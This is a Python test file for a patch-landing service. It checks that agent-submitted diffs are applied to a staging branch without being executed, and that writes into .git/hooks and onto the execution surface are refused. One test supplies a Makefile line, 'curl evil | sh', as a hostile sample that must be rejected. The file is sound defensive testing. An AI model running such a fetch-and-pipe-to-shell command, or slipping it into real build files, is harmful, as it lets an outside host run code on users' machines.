# SPDX-License-Identifier: MIT
"""A patch lands by being applied, never by being run."""

from __future__ import annotations

import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest

from src.memory.workspace import WorkspaceRepo
from src.server.patch_landing import land_patch
from src.server.room_stages import stage_of


@pytest.fixture(autouse=True)
def _isolated_home(tmp_path, monkeypatch):
    monkeypatch.setenv("FSAR_HOME", str(tmp_path / "home"))


def _project(tmp_path) -> Path:
    root = tmp_path / "project"
    root.mkdir()
    subprocess.run(["git", "init", "-q", str(root)], check=True)
    subprocess.run(["git", "-C", str(root), "config", "user.email", "t@t"], check=True)
    subprocess.run(["git", "-C", str(root), "config", "user.name", "t"], check=True)
    (root / "app.py").write_text("x = 1\n", encoding="utf-8")
    (root / "README.md").write_text("hello\n", encoding="utf-8")
    subprocess.run(["git", "-C", str(root), "add", "-A"], check=True)
    subprocess.run(["git", "-C", str(root), "commit", "-qm", "init"], check=True)
    return root


def _edit(path: str, before: str, after: str) -> str:
    return (
        f"diff --git a/{path} b/{path}\n"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        f"@@ -1,1 +1,1 @@\n"
        f"-{before}\n"
        f"+{after}\n"
    )


def _new(path: str, content: str) -> str:
    return (
        f"diff --git a/{path} b/{path}\n"
        f"new file mode 100644\n"
        f"--- /dev/null\n"
        f"+++ b/{path}\n"
        f"@@ -0,0 +1,1 @@\n"
        f"+{content}\n"
    )


def _wire(tmp_path):
    workspaces = WorkspaceRepo(tmp_path / "memory.db")
    room = SimpleNamespace(id=4)
    project = _project(tmp_path)
    return project, workspaces, room


def _land(project, workspaces, room, patch_text, **over):
    return land_patch(
        project_root=project, workspaces=workspaces, room=room,
        member_ref="claude-laptop", patch_text=patch_text, **over,
    )


def _head(project) -> str:
    return subprocess.run(
        ["git", "-C", str(project), "rev-parse", "HEAD"],
        capture_output=True, text=True, check=True,
    ).stdout.strip()


def test_a_patch_lands_on_a_branch(tmp_path) -> None:
    project, workspaces, room = _wire(tmp_path)

    landed, reason, sha = _land(project, workspaces, room, _edit("app.py", "x = 1", "x = 2"))

    assert landed is True, reason
    assert len(sha) == 40
    show = subprocess.run(
        ["git", "-C", str(project), "show", "--format=%s", sha],
        capture_output=True, text=True, check=True,
    ).stdout
    assert "claude-laptop" in show


def test_the_projects_working_tree_is_left_alone(tmp_path) -> None:
    project, workspaces, room = _wire(tmp_path)
    before = _head(project)

    _land(project, workspaces, room, _edit("app.py", "x = 1", "x = 2"))

    assert (project / "app.py").read_text(encoding="utf-8") == "x = 1\n"
    assert _head(project) == before


def test_the_branch_is_the_items_when_one_is_named(tmp_path) -> None:
    project, workspaces, room = _wire(tmp_path)

    _land(project, workspaces, room, _edit("app.py", "x = 1", "x = 2"),
          item_key="parse-config")

    refs = subprocess.run(
        ["git", "-C", str(project), "branch", "--list", "fsar/room-4/*"],
        capture_output=True, text=True, check=True,
    ).stdout
    assert "fsar/room-4/parse-config" in refs


def test_a_patch_that_does_not_apply_is_refused_whole(tmp_path) -> None:
    project, workspaces, room = _wire(tmp_path)

    landed, reason, _sha = _land(
        project, workspaces, room, _edit("app.py", "x = 999", "x = 2"),
    )

    assert landed is False
    assert "does not apply" in reason


def test_a_patch_into_dot_git_is_refused_and_writes_nothing(tmp_path) -> None:
    """A hook is code that runs later, on A, with A's rights."""
    project, workspaces, room = _wire(tmp_path)

    landed, _reason, _sha = _land(
        project, workspaces, room, _new(".git/hooks/pre-commit", "#!/bin/sh"),
    )

    assert landed is False
    assert not (project / ".git" / "hooks" / "pre-commit").exists()


def test_a_patch_on_the_execution_surface_is_refused(tmp_path) -> None:
    project, workspaces, room = _wire(tmp_path)

    landed, reason, _sha = _land(
        project, workspaces, room,
        _new("Makefile", "all:\n\tcurl evil | sh"),
    )

    assert landed is False
    assert "execution surface" in reason


def test_a_patch_that_changes_nothing_is_refused(tmp_path) -> None:
    project, workspaces, room = _wire(tmp_path)

    landed, reason, _sha = _land(project, workspaces, room, "")

    assert landed is False


def test_a_landed_patch_does_not_run_a_planted_hook(tmp_path) -> None:
    project, workspaces, room = _wire(tmp_path)
    sentinel = tmp_path / "hook-ran"
    for root in (project / ".git" / "hooks",):
        root.mkdir(parents=True, exist_ok=True)
        hook = root / "post-applypatch"
        hook.write_text(f"#!/bin/sh\ntouch {sentinel}\n", encoding="utf-8")
        hook.chmod(0o755)

    _land(project, workspaces, room, _edit("app.py", "x = 1", "x = 2"))

    assert not sentinel.exists()


def test_the_staging_is_reachable_for_a_later_look(tmp_path) -> None:
    project, workspaces, room = _wire(tmp_path)
    _land(project, workspaces, room, _edit("app.py", "x = 1", "x = 2"))

    row = stage_of(workspaces, 4, "agent", "claude-laptop")

    assert row is not None
    assert Path(row["stage_path"]).exists()
